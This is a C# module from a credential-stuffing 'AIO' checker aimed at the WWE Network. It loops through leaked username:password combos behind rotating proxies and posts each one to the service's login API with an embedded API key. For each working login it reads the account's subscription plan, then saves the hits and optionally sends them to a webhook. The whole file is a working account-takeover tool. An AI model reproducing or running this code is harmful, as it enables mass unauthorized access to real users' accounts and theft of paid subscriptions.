using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using BoltCUI;
using Leaf.xNet;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

namespace Bolt_AIO
{
    internal class WWEmod
    {
        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text = array[0] + ":" + array[1];
                        try
                        {
                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.AddHeader("Content-Type", "application/json");
                            req.AddHeader("x-api-key", "cca51ea0-7837-40df-a055-75eb6347b2e7");
                            req.AddHeader("realm", "dce.wwe");

                            req.UserAgent = "okhttp/3.14.6";

                            var strResponse = req.Post(new Uri("https://dce-frontoffice.imggaming.com/api/v2/login"),
                                    new BytesContent(Encoding.Default.GetBytes("{\"id\":\"" + array[0] +
                                                                               "\",\"secret\":\"" + array[1] + "\"}")))
                                .ToString();

                            if (strResponse.Contains("\"authorisationToken\""))
                            {
                                var jsonObj = (JObject) JsonConvert.DeserializeObject(strResponse);

                                var authorisationToken = jsonObj["authorisationToken"].ToString();

                                var captures = WWEGetCaptures(authorisationToken);

                                switch (captures)
                                {
                                    case "Free":
                                        Program.Frees++;
                                        Program.TotalChecks++;
                                        Export.AsResult("/Wordpress_frees", array[0] + ":" + array[1]);
                                        if (Program.lorc == "LOG")
                                            Settings.PrintFree("Wordpress", array[0] + ":" + array[1]);
                                        break;
                                    case "":
                                    {
                                        Program.Hits++;
                                        Program.TotalChecks++;
                                        Export.AsResult("/Wordpress_Capturefailed_hits", array[0] + ":" + array[1]);
                                        if (Settings.sendToWebhook)
                                            Settings.sendTowebhook1(array[0] + ":" + array[1],
                                                "Wordpress Hits Cap err");
                                        break;
                                    }
                                }

                                Program.Hits++;
                                Program.TotalChecks++;
                                Export.AsResult("/Wordpress_hits", array[0] + ":" + array[1] + " | " + captures);
                                if (Program.lorc == "LOG")
                                    Settings.PrintHit("Wordpress", array[0] + ":" + array[1] + " | " + captures);
                                if (Settings.sendToWebhook)
                                    Settings.sendTowebhook1(array[0] + ":" + array[1] + " | " + captures,
                                        "Wordpress Hits");
                            }
                            else
                            {
                                Program.Fails++;
                                Program.TotalChecks++;
                            }
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text);
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        private static string WWEGetCaptures(string authToken)
        {
            while (true)
                try
                {
                    using (var req = new HttpRequest())
                    {
                        switch (Program.ProxyType1)
                        {
                            case "HTTP":
                                req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                                break;
                            case "SOCKS4":
                                req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                                break;
                            case "SOCKS5":
                                req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                req.Proxy.ConnectTimeout = 5000;
                                break;
                        }

                        req.Authorization = "Bearer " + authToken;
                        req.AddHeader("x-api-key", "cca51ea0-7837-40df-a055-75eb6347b2e7");
                        req.AddHeader("realm", "dce.wwe");
                        req.AddHeader("sec-fetch-site", "cross-site");
                        req.AddHeader("sec-fetch-mode", "cors");
                        req.AddHeader("sec-fetch-dest", "empty");
                        req.AddHeader("accept", "application/json");
                        req.AddHeader("accept-language", "en-US,en;q=0.9,fa;q=0.8");
                        req.AddHeader("accept-encoding", "gzip, deflate, br");
                        req.Referer = "https://watch.wwe.com/account";
                        req.AddHeader("Origin", "https://watch.wwe.com");
                        req.UserAgent =
                            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36";

                        var strResponse = req.Get(new Uri("https://dce-frontoffice.imggaming.com/api/v2/user/licence"))
                            .ToString();

                        if (strResponse.Contains("\"status\":\"ACTIVE\""))
                        {
                            var planType = Regex.Match(strResponse, "\"type\":\"(.*?)\"").Groups[1].Value;
                            var plan = Regex.Match(strResponse, "\"name\":\"(.*?)\"").Groups[1].Value;

                            return $"Plan Type: {planType} - Plan: {plan}";
                        }

                        if (strResponse.Contains("{\"licences\":[]}") || strResponse == "[]")
                            return "Free";
                        return "";
                    }
                }
                catch
                {
                    Program.Errors++;
                }

            return "";
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}